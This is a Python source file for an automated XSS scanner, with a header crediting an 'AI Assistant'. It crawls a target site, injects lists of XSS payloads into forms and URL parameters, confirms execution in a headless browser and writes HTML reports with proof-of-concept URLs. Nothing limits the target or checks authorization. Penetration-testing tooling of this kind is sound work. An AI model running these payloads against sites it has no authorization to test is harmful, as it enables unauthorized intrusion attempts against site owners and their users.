#!/usr/bin/env python3
"""
Final Smart XSS Scanner - Complete Professional Solution
Deep reconnaissance + Context-aware validation + Screenshot only after confirmation
Author: AI Assistant
Version: 7.0 Final Smart
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import datetime

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class FinalSmartXSSScanner:
    def __init__(self, target_url, max_threads=8, delay=0.1, max_depth=3, timeout=8):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Data structures
        self.visited_urls = set()
        self.discovered_params = set()
        self.discovered_contexts = {}
        self.confirmed_vulnerabilities = []
        self.lock = threading.Lock()
        
        # Browser for validation
        self.browser = None
        self.context = None
        
        # Context-aware payloads
        self.payloads = self._load_context_aware_payloads()
        
        # Create directories
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Enhanced logging"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA,
            "PHASE": Fore.CYAN + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _load_context_aware_payloads(self):
        """Load context-aware XSS payloads"""
        return {
            'html': [
                '<script>alert("XSS_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_CONFIRMED")>',
                '<svg onload=alert("XSS_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
                '<body onload=alert("XSS_CONFIRMED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
                '" onclick="alert(\'XSS_CONFIRMED\')" x="',
                "' onclick='alert(\"XSS_CONFIRMED\")' x='"
            ],
            'javascript': [
                '";alert("XSS_CONFIRMED");//',
                "';alert('XSS_CONFIRMED');//",
                '";prompt("XSS_CONFIRMED");//',
                "';prompt('XSS_CONFIRMED');//"
            ],
            'css': [
                'url("javascript:alert(\'XSS_CONFIRMED\')")',
                'expression(alert("XSS_CONFIRMED"))'
            ]
        }
    
    def phase1_deep_reconnaissance(self):
        """Phase 1: Deep reconnaissance with comprehensive analysis"""
        self.log("=" * 70, "PHASE")
        self.log("PHASE 1: DEEP RECONNAISSANCE", "PHASE")
        self.log("=" * 70, "PHASE")
        
        try:
            # Test target
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Deep crawling with comprehensive analysis
            discovered_data = self._deep_crawl_comprehensive()
            
            self.log(f"Discovered {len(discovered_data['urls'])} URLs", "SUCCESS")
            self.log(f"Found {len(discovered_data['forms'])} forms", "SUCCESS")
            self.log(f"Identified {len(discovered_data['params'])} parameters", "SUCCESS")
            self.log(f"Analyzed {len(discovered_data['contexts'])} contexts", "SUCCESS")
            
            return discovered_data
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _deep_crawl_comprehensive(self):
        """Deep crawling with comprehensive analysis"""
        urls_to_visit = [(self.target_url, 0)]
        discovered_urls = set()
        all_forms = []
        all_params = set()
        all_contexts = {}
        base_domain = urlparse(self.target_url).netloc
        
        while urls_to_visit:
            current_url, depth = urls_to_visit.pop(0)
            
            if (current_url in self.visited_urls or 
                depth > self.max_depth or 
                current_url in discovered_urls):
                continue
            
            self.visited_urls.add(current_url)
            discovered_urls.add(current_url)
            
            try:
                response = self.session.get(current_url, timeout=self.timeout)
                response.raise_for_status()
                
                # Comprehensive content analysis
                content_analysis = self._analyze_content_comprehensive(response.text, current_url)
                all_contexts[current_url] = content_analysis
                
                # Extract links with advanced patterns
                links = self._extract_links_comprehensive(response.text, current_url)
                
                # Extract forms with context analysis
                forms = self._extract_forms_comprehensive(response.text, current_url)
                all_forms.extend(forms)
                
                # Extract parameters with context
                params = self._extract_parameters_comprehensive(response.text, current_url)
                all_params.update(params.keys())
                
                # Add same-origin links
                for link in links:
                    parsed = urlparse(link)
                    if (parsed.scheme in ('http', 'https') and 
                        parsed.netloc == base_domain and
                        link not in discovered_urls and
                        not self._is_static_resource(link)):
                        urls_to_visit.append((link, depth + 1))
                
                time.sleep(self.delay)
                
            except Exception:
                continue
        
        return {
            'urls': list(discovered_urls),
            'forms': all_forms,
            'params': list(all_params),
            'contexts': all_contexts
        }
    
    def _analyze_content_comprehensive(self, html_content, url):
        """Comprehensive content analysis for contexts"""
        contexts = {
            'html_reflections': [],
            'attribute_reflections': [],
            'javascript_reflections': [],
            'css_reflections': [],
            'url_reflections': [],
            'form_contexts': [],
            'input_contexts': []
        }
        
        # Analyze forms and inputs
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Analyze forms
        for form in soup.find_all('form'):
            form_context = {
                'action': form.get('action', ''),
                'method': form.get('method', 'GET'),
                'inputs': []
            }
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_context = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'context': self._analyze_input_context(input_tag),
                    'parent_context': self._analyze_parent_context(input_tag)
                }
                form_context['inputs'].append(input_context)
            
            contexts['form_contexts'].append(form_context)
        
        # Analyze JavaScript
        script_tags = soup.find_all('script')
        for script in script_tags:
            if script.string:
                js_context = self._analyze_javascript_context(script.string)
                contexts['javascript_reflections'].extend(js_context)
        
        return contexts
    
    def _analyze_input_context(self, input_tag):
        """Analyze input context"""
        context = 'unknown'
        
        # Check input type
        input_type = input_tag.get('type', 'text').lower()
        if input_type in ['search', 'text']:
            context = 'text_input'
        elif input_type == 'email':
            context = 'email_input'
        elif input_type == 'url':
            context = 'url_input'
        elif input_type == 'textarea':
            context = 'textarea'
        
        # Check for context clues in attributes
        if 'search' in str(input_tag.get('name', '')).lower():
            context = 'search_input'
        elif 'comment' in str(input_tag.get('name', '')).lower():
            context = 'comment_input'
        elif 'message' in str(input_tag.get('name', '')).lower():
            context = 'message_input'
        
        return context
    
    def _analyze_parent_context(self, input_tag):
        """Analyze parent context"""
        parent = input_tag.parent
        context = 'unknown'
        
        while parent and parent.name != 'form':
            if parent.name in ['div', 'span', 'p']:
                # Check for context clues
                class_attr = str(parent.get('class', [])).lower()
                id_attr = str(parent.get('id', '')).lower()
                
                if any(keyword in class_attr + id_attr for keyword in ['search', 'query']):
                    context = 'search_context'
                elif any(keyword in class_attr + id_attr for keyword in ['comment', 'review']):
                    context = 'comment_context'
                elif any(keyword in class_attr + id_attr for keyword in ['message', 'chat']):
                    context = 'message_context'
                elif any(keyword in class_attr + id_attr for keyword in ['profile', 'user']):
                    context = 'profile_context'
            
            parent = parent.parent
        
        return context
    
    def _analyze_javascript_context(self, js_code):
        """Analyze JavaScript context"""
        contexts = []
        
        # Look for parameter usage patterns
        param_patterns = [
            r'var\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'let\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'const\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'(\w+)\s*=\s*["\']([^"\']*)["\']'
        ]
        
        for pattern in param_patterns:
            matches = re.findall(pattern, js_code, re.IGNORECASE)
            for match in matches:
                contexts.append({
                    'type': 'javascript_variable',
                    'name': match[0],
                    'value': match[1],
                    'context': 'javascript'
                })
        
        return contexts
    
    def _extract_links_comprehensive(self, html_content, base_url):
        """Comprehensive link extraction"""
        links = []
        
        # Extract from <a> tags
        a_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
        a_matches = re.findall(a_pattern, html_content, re.IGNORECASE)
        
        # Extract from JavaScript
        js_patterns = [
            r'window\.location\s*=\s*["\']([^"\']+)["\']',
            r'location\.href\s*=\s*["\']([^"\']+)["\']',
            r'window\.open\s*\(\s*["\']([^"\']+)["\']',
            r'document\.location\s*=\s*["\']([^"\']+)["\']'
        ]
        
        js_matches = []
        for pattern in js_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            js_matches.extend(matches)
        
        # Extract from forms
        form_pattern = r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>'
        form_matches = re.findall(form_pattern, html_content, re.IGNORECASE)
        
        # Extract from iframes
        iframe_pattern = r'<iframe[^>]+src=["\']([^"\']+)["\'][^>]*>'
        iframe_matches = re.findall(iframe_pattern, html_content, re.IGNORECASE)
        
        all_matches = a_matches + js_matches + form_matches + iframe_matches
        
        for href in all_matches:
            full_url = urljoin(base_url, href)
            links.append(full_url)
        
        return links
    
    def _extract_forms_comprehensive(self, html_content, base_url):
        """Comprehensive form extraction with context analysis"""
        forms = []
        soup = BeautifulSoup(html_content, 'html.parser')
        
        for form in soup.find_all('form'):
            form_data = {
                'url': base_url,
                'action': form.get('action', ''),
                'method': form.get('method', 'GET').upper(),
                'enctype': form.get('enctype', ''),
                'inputs': [],
                'context': self._analyze_form_context(form)
            }
            
            # Extract input fields with comprehensive analysis
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_data = {
                    'name': input_tag.get('name', ''),
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', ''),
                    'placeholder': input_tag.get('placeholder', ''),
                    'id': input_tag.get('id', ''),
                    'class': input_tag.get('class', []),
                    'context': self._analyze_input_context(input_tag),
                    'parent_context': self._analyze_parent_context(input_tag)
                }
                form_data['inputs'].append(input_data)
            
            # Convert action to absolute URL
            if form_data['action']:
                form_data['action'] = urljoin(base_url, form_data['action'])
            else:
                form_data['action'] = base_url
            
            forms.append(form_data)
        
        return forms
    
    def _analyze_form_context(self, form_tag):
        """Analyze form context"""
        context = 'unknown'
        
        # Check form attributes
        action = form_tag.get('action', '').lower()
        method = form_tag.get('method', 'GET').lower()
        enctype = form_tag.get('enctype', '').lower()
        
        # Check for context clues
        if 'search' in action or 'query' in action:
            context = 'search_form'
        elif 'login' in action or 'auth' in action:
            context = 'login_form'
        elif 'comment' in action or 'review' in action:
            context = 'comment_form'
        elif 'contact' in action or 'message' in action:
            context = 'contact_form'
        elif method == 'post' and enctype == 'multipart/form-data':
            context = 'upload_form'
        
        return context
    
    def _extract_parameters_comprehensive(self, html_content, url):
        """Comprehensive parameter extraction"""
        params = {}
        
        # Extract from URL
        parsed_url = urlparse(url)
        url_params = parse_qs(parsed_url.query)
        params.update(url_params)
        
        # Extract from JavaScript variables
        js_patterns = [
            r'var\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'let\s+(\w+)\s*=\s*["\']([^"\']*)["\']',
            r'const\s+(\w+)\s*=\s*["\']([^"\']*)["\']'
        ]
        
        for pattern in js_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for name, value in matches:
                params[name] = [value]
        
        # Extract from hidden inputs
        hidden_pattern = r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']*)["\'][^>]*>'
        hidden_matches = re.findall(hidden_pattern, html_content, re.IGNORECASE)
        
        for name in hidden_matches:
            params[name] = []
        
        # Extract from data attributes
        data_pattern = r'data-(\w+)\s*=\s*["\']([^"\']*)["\']'
        data_matches = re.findall(data_pattern, html_content, re.IGNORECASE)
        
        for name, value in data_matches:
            params[f"data_{name}"] = [value]
        
        return params
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf', '.woff', '.woff2', '.ttf', '.eot', '.zip', '.rar']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def phase2_context_aware_validation(self, recon_data):
        """Phase 2: Context-aware XSS validation"""
        self.log("=" * 70, "PHASE")
        self.log("PHASE 2: CONTEXT-AWARE XSS VALIDATION", "PHASE")
        self.log("=" * 70, "PHASE")
        
        # Try browser validation first
        if PLAYWRIGHT_AVAILABLE:
            try:
                if self._init_browser():
                    self.log("Using browser validation", "INFO")
                    self._browser_validation_context_aware(recon_data)
                    self._close_browser()
                    return
            except Exception as e:
                self.log(f"Browser validation failed: {str(e)}", "WARNING")
        
        # Fallback to string matching
        self.log("Using context-aware string matching", "INFO")
        self._context_aware_string_matching(recon_data)
    
    def _init_browser(self):
        """Initialize browser"""
        try:
            playwright = sync_playwright().start()
            self.browser = playwright.chromium.launch(
                headless=True, 
                args=['--no-sandbox', '--disable-setuid-sandbox']
            )
            self.context = self.browser.new_context()
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser"""
        try:
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
        except Exception:
            pass
    
    def _browser_validation_context_aware(self, recon_data):
        """Context-aware browser validation"""
        # Test forms with context-aware payloads
        for form in recon_data['forms']:
            self._test_form_context_aware(form)
        
        # Test URL parameters with context-aware payloads
        for url in recon_data['urls']:
            self._test_url_context_aware(url, recon_data['contexts'].get(url, {}))
    
    def _test_form_context_aware(self, form):
        """Test form with context-aware payloads"""
        for input_field in form['inputs']:
            if input_field['name']:
                context = input_field.get('context', 'unknown')
                
                # Select appropriate payloads based on context
                payloads = self._get_payloads_for_context(context)
                
                for payload in payloads:
                    try:
                        # Prepare form data
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        # Test with browser
                        if self._validate_xss_with_confirmation(form['action'], form_data, payload, input_field['name']):
                            return True
                        
                        time.sleep(self.delay)
                        
                    except Exception:
                        continue
        return False
    
    def _test_url_context_aware(self, url, contexts):
        """Test URL with context-aware payloads"""
        params = self._extract_parameters_from_url(url)
        
        for param_name in params:
            # Determine context based on parameter name and page analysis
            context = self._determine_parameter_context(param_name, contexts)
            
            # Select appropriate payloads
            payloads = self._get_payloads_for_context(context)
            
            for payload in payloads:
                try:
                    test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                    
                    if self._validate_xss_with_confirmation(test_url, None, payload, param_name):
                        return True
                    
                    time.sleep(self.delay)
                    
                except Exception:
                    continue
        return False
    
    def _get_payloads_for_context(self, context):
        """Get appropriate payloads for context"""
        if context in ['search_input', 'search_context', 'search_form']:
            return self.payloads['html'][:3]
        elif context in ['comment_input', 'comment_context', 'message_input', 'message_context']:
            return self.payloads['attribute'][:3]
        elif context in ['url_input', 'javascript']:
            return self.payloads['javascript'][:3]
        elif context in ['css', 'style']:
            return self.payloads['css'][:3]
        else:
            return self.payloads['html'][:3]
    
    def _determine_parameter_context(self, param_name, contexts):
        """Determine parameter context"""
        param_name_lower = param_name.lower()
        
        if any(keyword in param_name_lower for keyword in ['search', 'query', 'q', 'term']):
            return 'search_input'
        elif any(keyword in param_name_lower for keyword in ['comment', 'message', 'text', 'content', 'review']):
            return 'comment_input'
        elif any(keyword in param_name_lower for keyword in ['url', 'link', 'href']):
            return 'url_input'
        elif any(keyword in param_name_lower for keyword in ['style', 'css', 'color']):
            return 'css'
        else:
            return 'html'
    
    def _extract_parameters_from_url(self, url):
        """Extract parameters from URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params
    
    def _validate_xss_with_confirmation(self, url, form_data, payload, param_name):
        """Validate XSS with confirmation - screenshot ONLY after confirmation"""
        try:
            page = self.context.new_page()
            
            # Set up alert handler
            alert_dialog = None
            def handle_dialog(dialog):
                nonlocal alert_dialog
                alert_dialog = dialog
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                page.goto(url, wait_until="domcontentloaded", timeout=self.timeout * 1000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        page.fill(f'input[name="{field_name}"], textarea[name="{field_name}"]', field_value)
                    except:
                        pass
                
                # Submit
                page.click('input[type="submit"], button[type="submit"]')
                page.wait_for_load_state("domcontentloaded", timeout=self.timeout * 1000)
            else:
                # Direct URL
                page.goto(url, wait_until="domcontentloaded", timeout=self.timeout * 1000)
            
            # Wait for potential XSS
            time.sleep(2)
            
            # Check if alert was triggered - ONLY take screenshot if confirmed
            if alert_dialog:
                # XSS is CONFIRMED - now take screenshot
                screenshot_path = self._take_screenshot(page, param_name, payload)
                
                # Add to confirmed vulnerabilities
                with self.lock:
                    vuln = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'screenshot': screenshot_path,
                        'timestamp': datetime.datetime.now().isoformat(),
                        'alert_message': alert_dialog.message,
                        'confirmed': True
                    }
                    self.confirmed_vulnerabilities.append(vuln)
                    self.log(f"✅ CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    self.log(f"Payload: {payload}", "VULN")
                    if screenshot_path:
                        self.log(f"Screenshot: {screenshot_path}", "VULN")
                
                page.close()
                return True
            
            page.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            try:
                page.close()
            except:
                pass
            return False
    
    def _take_screenshot(self, page, param_name, payload):
        """Take screenshot ONLY after XSS confirmation"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_param = re.sub(r'[^\w\-_]', '_', param_name)
            safe_payload = re.sub(r'[^\w\-_]', '_', payload[:8])
            
            filename = f"confirmed_xss_{safe_param}_{safe_payload}_{timestamp}.png"
            screenshot_path = os.path.join('screenshots', filename)
            
            page.screenshot(path=screenshot_path, full_page=True)
            return screenshot_path
            
        except Exception as e:
            self.log(f"Screenshot error: {str(e)}", "ERROR")
            return None
    
    def _context_aware_string_matching(self, recon_data):
        """Context-aware string matching validation"""
        self.log("Using context-aware string matching validation", "INFO")
        
        # Test forms
        for form in recon_data['forms']:
            for input_field in form['inputs']:
                if input_field['name']:
                    context = input_field.get('context', 'unknown')
                    payloads = self._get_payloads_for_context(context)
                    
                    for payload in payloads:
                        try:
                            # Prepare form data
                            form_data = {}
                            for field in form['inputs']:
                                if field['name'] == input_field['name']:
                                    form_data[field['name']] = payload
                                else:
                                    form_data[field['name']] = field['value']
                            
                            # Test with requests
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
                            
                            # Check for XSS indicators
                            if self._check_xss_indicators(response.text, payload):
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'screenshot': None,
                                        'timestamp': datetime.datetime.now().isoformat(),
                                        'alert_message': 'String matching detection',
                                        'confirmed': False
                                    }
                                    self.confirmed_vulnerabilities.append(vuln)
                                    self.log(f"⚠️ POTENTIAL XSS! Parameter: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                
                                break  # Found XSS for this parameter
                            
                            time.sleep(self.delay)
                            
                        except Exception:
                            continue
        
        # Test URL parameters
        for url in recon_data['urls']:
            params = self._extract_parameters_from_url(url)
            for param_name in params:
                context = self._determine_parameter_context(param_name, recon_data['contexts'].get(url, {}))
                payloads = self._get_payloads_for_context(context)
                
                for payload in payloads:
                    try:
                        test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        if self._check_xss_indicators(response.text, payload):
                            with self.lock:
                                vuln = {
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'screenshot': None,
                                    'timestamp': datetime.datetime.now().isoformat(),
                                    'alert_message': 'String matching detection',
                                    'confirmed': False
                                }
                                self.confirmed_vulnerabilities.append(vuln)
                                self.log(f"⚠️ POTENTIAL XSS! Parameter: {param_name}", "VULN")
                                self.log(f"Payload: {payload}", "VULN")
                            
                            break  # Found XSS for this parameter
                        
                        time.sleep(self.delay)
                        
                    except Exception:
                        continue
    
    def _check_xss_indicators(self, response_text, payload):
        """Check for XSS indicators"""
        # Check if payload is reflected
        if payload in response_text:
            # Check for execution indicators
            execution_indicators = [
                'alert(',
                'prompt(',
                'confirm(',
                '<script>',
                'onerror=',
                'onload=',
                'onclick=',
                'onmouseover=',
                'onfocus='
            ]
            
            for indicator in execution_indicators:
                if indicator in response_text:
                    return True
        
        return False
    
    def generate_report(self):
        """Generate HTML report"""
        self.log("Generating HTML report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'final_smart_xss_report_{timestamp}.html')
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Final Smart XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1000px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }}
        .header {{ text-align: center; border-bottom: 2px solid #e74c3c; padding-bottom: 20px; margin-bottom: 30px; }}
        .header h1 {{ color: #e74c3c; }}
        .summary {{ background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
        .stats {{ display: flex; justify-content: space-around; margin: 20px 0; }}
        .stat {{ text-align: center; }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #e74c3c; }}
        .vulnerability {{ background: #fff5f5; border: 1px solid #fecaca; padding: 20px; margin: 20px 0; border-radius: 8px; }}
        .vulnerability.confirmed {{ background: #d4edda; border-color: #c3e6cb; }}
        .vulnerability.potential {{ background: #fff3cd; border-color: #ffeaa7; }}
        .vulnerability h3 {{ margin-top: 0; }}
        .vulnerability.confirmed h3 {{ color: #155724; }}
        .vulnerability.potential h3 {{ color: #856404; }}
        .screenshot {{ max-width: 100%; border: 1px solid #ddd; margin: 10px 0; }}
        .poc {{ background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace; word-break: break-all; }}
        .no-vulns {{ text-align: center; color: #28a745; font-size: 1.2em; padding: 40px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Final Smart XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="summary">
            <h2>📊 Scan Summary</h2>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">{len(self.confirmed_vulnerabilities)}</div>
                    <div>Total Findings</div>
                </div>
                <div class="stat">
                    <div class="stat-number">{len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])}</div>
                    <div>Confirmed XSS</div>
                </div>
                <div class="stat">
                    <div class="stat-number">{len(self.visited_urls)}</div>
                    <div>URLs Scanned</div>
                </div>
                <div class="stat">
                    <div class="stat-number">{len(self.discovered_params)}</div>
                    <div>Parameters Found</div>
                </div>
            </div>
        </div>
        
        <h2>🎯 XSS Vulnerabilities</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '<div class="no-vulns">✅ No XSS vulnerabilities found</div>'
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                vuln_class = 'confirmed' if vuln.get('confirmed', False) else 'potential'
                status_icon = '✅' if vuln.get('confirmed', False) else '⚠️'
                
                html_content += f"""
                <div class="vulnerability {vuln_class}">
                    <h3>{status_icon} Vulnerability #{i}</h3>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                    <p><strong>Payload:</strong> {vuln['payload']}</p>
                    <p><strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}</p>
                    <p><strong>Status:</strong> {'Confirmed' if vuln.get('confirmed', False) else 'Potential'}</p>
                    <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    
                    <strong>POC URL:</strong>
                    <div class="poc">{vuln['url']}?{vuln['parameter']}={urllib.parse.quote(vuln['payload'])}</div>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="XSS Screenshot" class="screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += """
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"HTML report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method"""
        start_time = time.time()
        
        self.log("🚀 Starting Final Smart XSS Scanner v7.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        
        try:
            # Phase 1: Deep reconnaissance
            recon_data = self.phase1_deep_reconnaissance()
            if not recon_data:
                self.log("Phase 1 failed, aborting scan", "ERROR")
                return
            
            # Phase 2: Context-aware validation
            self.phase2_context_aware_validation(recon_data)
            
            # Generate report
            report_path = self.generate_report()
            
            # Show results
            self._show_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
    
    def _show_results(self, report_path):
        """Show scan results"""
        self.log("=" * 70, "PHASE")
        self.log("SCAN RESULTS", "PHASE")
        self.log("=" * 70, "PHASE")
        
        confirmed_count = len([v for v in self.confirmed_vulnerabilities if v.get('confirmed', False)])
        potential_count = len([v for v in self.confirmed_vulnerabilities if not v.get('confirmed', False)])
        
        self.log(f"Total findings: {len(self.confirmed_vulnerabilities)}", "SUCCESS")
        self.log(f"Confirmed XSS: {confirmed_count}", "SUCCESS")
        self.log(f"Potential XSS: {potential_count}", "WARNING")
        
        if self.confirmed_vulnerabilities:
            self.log("\n🎯 XSS VULNERABILITIES:", "VULN")
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                status = "✅ CONFIRMED" if vuln.get('confirmed', False) else "⚠️ POTENTIAL"
                self.log(f"\n--- {status} Vulnerability #{i} ---", "VULN")
                self.log(f"URL: {vuln['url']}", "VULN")
                self.log(f"Parameter: {vuln['parameter']}", "VULN")
                self.log(f"Payload: {vuln['payload']}", "VULN")
                if vuln.get('screenshot'):
                    self.log(f"Screenshot: {vuln['screenshot']}", "VULN")
        else:
            self.log("\n✅ No XSS vulnerabilities found", "SUCCESS")
        
        if report_path:
            self.log(f"\n📄 HTML Report: {report_path}", "SUCCESS")
        
        self.log("\n🔒 Screenshots taken ONLY for confirmed XSS vulnerabilities", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Final Smart XSS Scanner v7.0')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=8, help='Number of threads (default: 8)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1)')
    parser.add_argument('--depth', type=int, default=3, help='Crawling depth (default: 3)')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout (default: 8)')
    
    args = parser.parse_args()
    
    scanner = FinalSmartXSSScanner(
        args.url,
        args.threads,
        args.delay,
        args.depth,
        args.timeout
    )
    
    scanner.scan()

if __name__ == "__main__":
    main()